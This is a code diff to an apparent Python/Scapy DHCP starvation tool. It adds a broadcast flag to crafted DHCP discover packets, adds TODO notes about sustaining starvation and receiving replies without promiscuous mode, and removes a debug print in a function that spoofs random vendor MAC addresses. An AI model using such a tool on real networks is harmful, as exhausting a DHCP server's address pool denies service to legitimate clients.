@@ -28,12 +28,19 @@ class MESSAGETYPE:
 class DHCP_ATTS:
     MSGTYPE = MESSAGETYPE()
 
+class FLAGS_BOOTP:
+    BROADCAST = 0x8000
+class BOOTP_ATTS:
+    FLAGS = FLAGS_BOOTP()
+
 """
 TODO make mac templates
 TODO verbose flag
 TODO option to write pcap
 TODO use python buit-in logger
 TODO check keep alive while starving
+TODO option to get replies without being promisc
+TODO vendor id in dhcp
 """
 
 
@@ -103,7 +110,7 @@ def dhcp_discover(src_mac : str, interface : str = conf.iface):
     discover_packet = Ether(dst = ETHER_BROADCAST, src=src_mac, type=ETHER_TYPES.IPv4)\
                         / IP(dst=IP_GLOBAL_BROADCAST, src='0.0.0.0')\
                         / UDP(dport=67,sport=68)\
-                        / BOOTP(htype=1,op=1,chaddr=mac_to_binary(src_mac), xid = random_transaction_id(), ciaddr = '0.0.0.0')\
+                        / BOOTP(htype=1,op=1,chaddr=mac_to_binary(src_mac), xid = random_transaction_id(), ciaddr = '0.0.0.0', flags = BOOTP_ATTS.FLAGS.BROADCAST)\
                         / DHCP(options=dhcp_options)
     sendp(discover_packet, iface=interface)   
 
@@ -285,7 +292,7 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
         i += 1
 
         mac_template = mac.macs[random.randint(0,len(mac.macs) - 1)][1]
-        print(mac_template)
+
         temp_mac = str(RandMAC(mac_template))
 
         offer = [None]
